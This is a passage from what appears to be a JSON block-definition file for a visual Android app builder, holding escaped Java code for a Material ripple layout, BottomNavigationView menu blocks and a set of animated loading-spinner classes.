currentCoords \u003d new Point(getWidth() / 2, getHeight() / 2);\n        startRipple(null);\n    }\n    public void performRipple(Point anchor) {\n        currentCoords \u003d new Point(anchor.x, anchor.y);\n        startRipple(null);\n    }\n    private void enableClipPathSupportIfNecessary() {\n        if (Build.VERSION.SDK_INT \u003c\u003d Build.VERSION_CODES.JELLY_BEAN_MR1) {\n            if (rippleRoundedCorners !\u003d 0) {\n                layerType \u003d getLayerType();\n                setLayerType(LAYER_TYPE_SOFTWARE, null);\n            } else {\n                setLayerType(layerType, null);\n            }\n        }\n    }\n    private class PerformClickEvent implements Runnable {\n        @Override public void run() {\n            if (hasPerformedLongPress) return;\n            if (getParent() instanceof AdapterView) {\n                if (!childView.performClick())\n                    clickAdapterView((AdapterView) getParent());\n            } else if (rippleInAdapter) {\n                clickAdapterView(findParentAdapterView());\n            } else {\n                childView.performClick();\n            }\n        }\n        private void clickAdapterView(AdapterView parent) {\n            final int position \u003d parent.getPositionForView(MaterialRippleLayout.this);\n            final long itemId \u003d parent.getAdapter() !\u003d null\n                ? parent.getAdapter().getItemId(position)\n                : 0;\n            if (position !\u003d AdapterView.INVALID_POSITION) {\n                parent.performItemClick(MaterialRippleLayout.this, position, itemId);\n            }\n        }\n    }\n    private final class PressedEvent implements Runnable {\n        private final MotionEvent event;\n        public PressedEvent(MotionEvent event) {\n            this.event \u003d event;\n        }\n        @Override\n        public void run() {\n            prepressed \u003d false;\n            childView.setLongClickable(false);\n            childView.onTouchEvent(event);\n            childView.setPressed(true);\n            if (rippleHover) {\n                startHover();\n            }\n        }\n    }\n    static float dpToPx(android.content.res.Resources resources, float dp) {\n        return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, resources.getDisplayMetrics());\n    }\n    public static class RippleBuilder {\n        private final Context context;\n        private final View    child;\n        private int     rippleColor         \u003d DEFAULT_COLOR;\n        private boolean rippleOverlay       \u003d DEFAULT_RIPPLE_OVERLAY;\n        private boolean rippleHover         \u003d DEFAULT_HOVER;\n        private float   rippleDiameter      \u003d DEFAULT_DIAMETER_DP;\n        private int     rippleDuration      \u003d DEFAULT_DURATION;\n        private float   rippleAlpha         \u003d DEFAULT_ALPHA;\n        private boolean rippleDelayClick    \u003d DEFAULT_DELAY_CLICK;\n        private int     rippleFadeDuration  \u003d DEFAULT_FADE_DURATION;\n        private boolean ripplePersistent    \u003d DEFAULT_PERSISTENT;\n        private int     rippleBackground    \u003d DEFAULT_BACKGROUND;\n        private boolean rippleSearchAdapter \u003d DEFAULT_SEARCH_ADAPTER;\n        private float   rippleRoundedCorner \u003d DEFAULT_ROUNDED_CORNERS;\n        public RippleBuilder(View child) {\n            this.child \u003d child;\n            this.context \u003d child.getContext();\n        }\n        public RippleBuilder rippleColor(int color) {\n            this.rippleColor \u003d color;\n            return this;\n        }\n        public RippleBuilder rippleOverlay(boolean overlay) {\n            this.rippleOverlay \u003d overlay;\n            return this;\n        }\n        public RippleBuilder rippleHover(boolean hover) {\n            this.rippleHover \u003d hover;\n            return this;\n        }\n        public RippleBuilder rippleDiameterDp(int diameterDp) {\n            this.rippleDiameter \u003d diameterDp;\n            return this;\n        }\n        public RippleBuilder rippleDuration(int duration) {\n            this.rippleDuration \u003d duration;\n            return this;\n        }\n        public RippleBuilder rippleAlpha(float alpha) {\n            this.rippleAlpha \u003d alpha;\n            return this;\n        }\n        public RippleBuilder rippleDelayClick(boolean delayClick) {\n            this.rippleDelayClick \u003d delayClick;\n            return this;\n        }\n        public RippleBuilder rippleFadeDuration(int fadeDuration) {\n            this.rippleFadeDuration \u003d fadeDuration;\n            return this;\n        }\n        public RippleBuilder ripplePersistent(boolean persistent) {\n            this.ripplePersistent \u003d persistent;\n            return this;\n        }\n        public RippleBuilder rippleBackground(int color) {\n            this.rippleBackground \u003d color;\n            return this;\n        }\n        public RippleBuilder rippleInAdapter(boolean inAdapter) {\n            this.rippleSearchAdapter \u003d inAdapter;\n            return this;\n        }\n        public RippleBuilder rippleRoundedCorners(int radiusDp) {\n            this.rippleRoundedCorner \u003d radiusDp;\n            return this;\n        }\n        public MaterialRippleLayout create() {\n            MaterialRippleLayout layout \u003d new MaterialRippleLayout(context);\n            layout.setRippleColor(rippleColor);\n            layout.setDefaultRippleAlpha(rippleAlpha);\n            layout.setRippleDelayClick(rippleDelayClick);\n            layout.setRippleDiameter((int) dpToPx(context.getResources(), rippleDiameter));\n            layout.setRippleDuration(rippleDuration);\n            layout.setRippleFadeDuration(rippleFadeDuration);\n            layout.setRippleHover(rippleHover);\n            layout.setRipplePersistent(ripplePersistent);\n            layout.setRippleOverlay(rippleOverlay);\n            layout.setRippleBackground(rippleBackground);\n            layout.setRippleInAdapter(rippleSearchAdapter);\n            layout.setRippleRoundedCorners((int) dpToPx(context.getResources(), rippleRoundedCorner));\n            ViewGroup.LayoutParams params \u003d child.getLayoutParams();\n            ViewGroup parent \u003d (ViewGroup) child.getParent();\n            int index \u003d 0;\n            if (parent !\u003d null \u0026\u0026 parent instanceof MaterialRippleLayout) {\n                throw new IllegalStateException(\"MaterialRippleLayout could not be created: parent of the view already is a MaterialRippleLayout\");\n            }\n            if (parent !\u003d null) {\n                index \u003d parent.indexOfChild(child);\n                parent.removeView(child);\n            }\n            layout.addView(child, new ViewGroup.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, android.view.ViewGroup.LayoutParams.MATCH_PARENT));\n            if (parent !\u003d null) {\n                parent.addView(layout, index, params);\n            }\n            return layout;\n        }\n    }\n}\n{","name":"MaterialRipple Lib","palette":"42","type":" ","spec":"MaterialRipple Lib"},{"code":"MaterialRippleLayout.on(%1$s)\n           .rippleColor(%2$s)\n           .create();","name":"MaterialRipple ","palette":"42","type":" ","spec":"MaterialRipple%m.view colour%m.color"},{"code":"%s.getMenu().add(%s);","name":"bnv addMenu","palette":"43","type":" ","spec":"%m.BottomNavigationView addMenu %s"},{"code":"%s.getMenu().add(%s).setIcon(R.drawable.%s);","name":"bnv addMenuWithIcon","palette":"43","type":" ","spec":"%m.BottomNavigationView addMenu %s withIcon %m.resource_bg"},{"code":"%s.setItemBackgroundResource(R.drawable.%s);","name":"bnv setItemBackgroundResource","palette":"43","type":" ","spec":"%m.BottomNavigationView setItemBackgroundResource %m.resource_bg"},{"code":"%s.setItemIconSize(%s);","name":"bnv setItemIconSize","palette":"43","type":" ","spec":"%m.BottomNavigationView setItemIconSize %d"},{"code":"%s.setSelectedItemId(%s);","name":"bnv setSelectedItemId","palette":"43","type":" ","spec":"%m.BottomNavigationView setSelectedItemId %d"},{"code":"if (_titleMenu.equals(\"%s\")) {\r\n\t%s\t\t\t\t\r\n}","name":"sendbroad","palette":"43","type":"c","spec":"On Item By Id %s.InputOnly Clicked"},{"code":"return true;","color":"#2196f3","name":"returntrue","palette":"43","type":" ","spec":"Bottom End Block"},{"code":"\t\n\t\t\n}\n\t\t\tpublic class Arc extends GraphicObject {\n\t\t\t\tprivate android.graphics.RectF oval;\n\t\t\t\tprivate float startAngle;\n\t\t\t\tprivate float sweepAngle;\n\t\t\t\tprivate boolean useCenter;\n\n\t\t\t\tpublic void setOval(android.graphics.RectF oval) {\n\t\t\t\t\tthis.oval \u003d oval;\n\t\t\t\t}\n\n\t\t\t\tpublic void setStartAngle(float startAngle) {\n\t\t\t\t\tthis.startAngle \u003d startAngle;\n\t\t\t\t}\n\n\t\t\t\tpublic void setSweepAngle(float sweepAngle) {\n\t\t\t\t\tthis.sweepAngle \u003d sweepAngle;\n\t\t\t\t}\n\n\t\t\t\tpublic void setUseCenter(boolean useCenter) {\n\t\t\t\t\tthis.useCenter \u003d useCenter;\n\t\t\t\t}\n\n\t\t\t\tpublic float getStartAngle() {\n\t\t\t\t\treturn startAngle;\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawArc(oval, startAngle, sweepAngle, useCenter, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic class Balloon extends LoaderView {\n\t\t\t\t@Override public void initializeObjects() {\n\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Circle extends GraphicObject {\n\t\t\t\tprivate PointF center;\n\t\t\t\tprivate float radius;\n\n\t\t\t\tpublic Circle() {\n\t\t\t\t\tcenter \u003d new PointF();\n\t\t\t\t}\n\n\t\t\t\tpublic void setRadius(float radius) {\n\t\t\t\t\tthis.radius \u003d radius;\n\t\t\t\t}\n\n\t\t\t\tpublic void setCenter(float x, float y) {\n\t\t\t\t\tcenter.set(x, y);\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawCircle(center.x, center.y, radius, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class ClassicSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int circlesSize;\n\n\t\t\t\tpublic ClassicSpinner() {\n\t\t\t\t\tcirclesSize \u003d 8;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[circlesSize];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setAlpha(126);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tcircles[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(45 * i, center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class FishSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int numberOfCircle;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic FishSpinner() {\n\t\t\t\t\tnumberOfCircle \u003d 5;\n\t\t\t\t\trotates \u003d new float[numberOfCircle];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[numberOfCircle];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * i / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1700);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 100);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic abstract class GraphicObject {\n\t\t\t\tprotected android.graphics.Paint paint;\n\n\t\t\t\tpublic GraphicObject() {\n\t\t\t\t\tpaint \u003d new android.graphics.Paint();\n\t\t\t\t\tpaint.setAntiAlias(true);\n\t\t\t\t}\n\n\t\t\t\tpublic void setColor(int color) {\n\t\t\t\t\tpaint.setColor(color);\n\t\t\t\t}\n\n\t\t\t\tpublic void setAlpha(int alpha) {\n\t\t\t\t\tpaint.setAlpha(alpha);\n\t\t\t\t}\n\n\t\t\t\tpublic void setWidth(float width) {\n\t\t\t\t\tpaint.setStrokeWidth(width);\n\t\t\t\t}\n\n\t\t\t\tpublic void setStyle(android.graphics.Paint.Style style) {\n\t\t\t\t\tpaint.setStyle(style);\n\t\t\t\t}\n\n\t\t\t\tpublic abstract void draw(android.graphics.Canvas canvas);\n\t\t\t}\n\n\n\t\t\tpublic interface InvalidateListener {\n\t\t\t\tvoid reDraw();\n\t\t\t}\n\n\t\t\tpublic class InvalidNumberOfPulseException extends Exception {\n\n\t\t\t\t@Override public String getMessage() {\n\t\t\t\t\treturn \"The number of pulse must be between 2 and 6\";\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Line extends GraphicObject {\n\t\t\t\tprivate PointF point1;\n\t\t\t\tprivate PointF point2;\n\n\t\t\t\tpublic void setPoint1(PointF point1) {\n\t\t\t\t\tthis.point1 \u003d point1;\n\t\t\t\t}\n\n\t\t\t\tpublic void setPoint2(PointF point2) {\n\t\t\t\t\tthis.point2 \u003d point2;\n\t\t\t\t}\n\n\t\t\t\tpublic PointF getPoint1() {\n\t\t\t\t\treturn point1;\n\t\t\t\t}\n\n\t\t\t\tpublic PointF getPoint2() {\n\t\t\t\t\treturn point2;\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawLine(point1.x, point1.y, point2.x, point2.y, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class LineSpinner extends LoaderView {\n\t\t\t\tprivate Line[] lines;\n\t\t\t\tprivate int numberOfLine;\n\n\t\t\t\tpublic LineSpinner() {\n\t\t\t\t\tnumberOfLine \u003d 8;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tint size \u003d Math.min(width, height);\n\t\t\t\t\tfloat lineWidth \u003d size / 10f;\n\t\t\t\t\tlines \u003d new Line[numberOfLine];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tlines[i] \u003d new Line();\n\t\t\t\t\t\tlines[i].setColor(color);\n\t\t\t\t\t\tlines[i].setAlpha(126);\n\t\t\t\t\t\tlines[i].setWidth(lineWidth);\n\t\t\t\t\t\tlines[i].setPoint1(new PointF(center.x, center.y - size / 2f + lineWidth));\n\t\t\t\t\t\tlines[i].setPoint2(new PointF(center.x, lines[i].getPoint1().y + 2 * lineWidth));\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tlines[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(45 * i, center.x, center.y);\n\t\t\t\t\t\tlines[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class PhoneWave extends LoaderView {\n\t\t\t\tprivate Arc[] arcs;\n\t\t\t\tprivate int numberOfArc;\n\n\t\t\t\tpublic PhoneWave() {\n\t\t\t\t\tnumberOfArc \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\tarcs \u003d new Arc[numberOfArc];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfloat d \u003d r / 4 + i * r / 4;\n\t\t\t\t\t\tarcs[i] \u003d new Arc();\n\t\t\t\t\t\tarcs[i].setColor(color);\n\t\t\t\t\t\tarcs[i].setAlpha(126);\n\t\t\t\t\t\tarcs[i].setOval(new android.graphics.RectF(center.x - d, center.y - d + r / 3, center.x + d, center.y + d + r / 3));\n\t\t\t\t\t\tarcs[i].setStartAngle(225);\n\t\t\t\t\t\tarcs[i].setSweepAngle(90);\n\t\t\t\t\t\tarcs[i].setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\t\tarcs[i].setWidth(r / 10f);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(i * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tarcs[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tarcs[i].draw(canvas);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Pulse extends LoaderView {\n\t\t\t\tprivate Line[] lines;\n\t\t\t\tprivate int numberOfLines;\n\t\t\t\tprivate float lineWidth;\n\t\t\t\tprivate float lineDistance;\n\t\t\t\tprivate float[] scaleY;\n\n\t\t\t\tpublic Pulse(int numberOfLines) throws InvalidNumberOfPulseException {\n\t\t\t\t\tif (numberOfLines \u003c 3 || numberOfLines \u003e 5) {\n\t\t\t\t\t\tthrow new InvalidNumberOfPulseException();\n\t\t\t\t\t}\n\n\t\t\t\t\tthis.numberOfLines \u003d numberOfLines;\n\t\t\t\t\tlines \u003d new Line[numberOfLines];\n\t\t\t\t\tscaleY \u003d new float[numberOfLines];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tlineWidth \u003d width / (2 * numberOfLines);\n\t\t\t\t\tlineDistance \u003d lineWidth / 4f;\n\t\t\t\t\tfloat firstX \u003d (width - (lineWidth * numberOfLines + lineDistance * (numberOfLines - 1))) / 2f + lineWidth / 2f;\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tlines[i] \u003d new Line();\n\t\t\t\t\t\tlines[i].setColor(color);\n\t\t\t\t\t\tlines[i].setWidth(lineWidth);\n\t\t\t\t\t\tlines[i].setPoint1(new PointF(firstX, center.y - height / 4f));\n\t\t\t\t\t\tlines[i].setPoint2(new PointF(firstX, center.y + height / 4f));\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\t\t\t\t\t\tandroid.animation.ValueAnimator scaleAnimator \u003d android.animation.ValueAnimator.ofFloat(1f, 1.5f, 1f);\n\t\t\t\t\t\tscaleAnimator.setDuration(1000);\n\t\t\t\t\t\tscaleAnimator.setStartDelay(i * 120);\n\t\t\t\t\t\tscaleAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tscaleAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tscaleY[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tscaleAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.translate(i * (lineWidth + lineDistance), 0);\n\t\t\t\t\t\tcanvas.scale(1, scaleY[i], lines[i].getPoint1().x, center.y);\n\t\t\t\t\t\tlines[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Radar extends LoaderView {\n\t\t\t\tprivate Line line;\n\t\t\t\tprivate float degree;\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tline \u003d new Line();\n\t\t\t\t\tline.setPoint1(center);\n\t\t\t\t\tline.setPoint2(new PointF(0, size / 2f));\n\t\t\t\t\tline.setColor(color);\n\t\t\t\t\tline.setWidth(5);\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tandroid.animation.ValueAnimator animator \u003d android.animation.ValueAnimator.ofFloat(0, 359);\n\t\t\t\t\tanimator.setDuration(1000);\n\t\t\t\t\tanimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\tanimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\tdegree \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tanimator.start();\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.save();\n\t\t\t\t\tcanvas.rotate(degree, center.x, center.y);\n\t\t\t\t\tline.draw(canvas);\n\t\t\t\t\tcanvas.restore();\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Sharingan extends LoaderView {\n\t\t\t\tprivate Circle eye;\n\t\t\t\tprivate Circle eyeBound;\n\t\t\t\tprivate Circle[] sharingans;\n\t\t\t\tprivate int numberOfSharingan;\n\t\t\t\tprivate float rotate;\n\t\t\t\tprivate float scale;\n\t\t\t\tprivate float eyeBoundRadius;\n\t\t\t\tprivate float eyeBoundRadiusScale;\n\n\t\t\t\tpublic Sharingan() {\n\t\t\t\t\tnumberOfSharingan \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\teyeBoundRadius \u003d r / 1.5f;\n\n\t\t\t\t\teye \u003d new Circle();\n\t\t\t\t\teye.setCenter(center.x, center.y);\n\t\t\t\t\teye.setColor(color);\n\t\t\t\t\teye.setRadius(r / 4);\n\n\t\t\t\t\teyeBound \u003d new Circle();\n\t\t\t\t\teyeBound.setCenter(center.x, center.y);\n\t\t\t\t\teyeBound.setColor(color);\n\t\t\t\t\teyeBound.setRadius(eyeBoundRadius);\n\t\t\t\t\teyeBound.setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\teyeBound.setWidth(r / 20f);\n\n\t\t\t\t\tsharingans \u003d new Circle[numberOfSharingan];\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfSharingan; i++) {\n\t\t\t\t\t\tsharingans[i] \u003d new Circle();\n\t\t\t\t\t\tsharingans[i].setCenter(center.x, center.y - eyeBoundRadius);\n\t\t\t\t\t\tsharingans[i].setColor(color);\n\t\t\t\t\t\tsharingans[i].setRadius(r / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tandroid.animation.ValueAnimator rotateAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\trotateAnimator.setDuration(1500);\n\t\t\t\t\trotateAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\trotateAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\trotate \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tandroid.animation.ValueAnimator scaleAnimator \u003d android.animation.ValueAnimator.ofFloat(1f, 0.8f, 1f);\n\t\t\t\t\tscaleAnimator.setDuration(1000);\n\t\t\t\t\tscaleAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\tscaleAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\tscale \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tandroid.animation.AnimatorSet animatorSet \u003d new 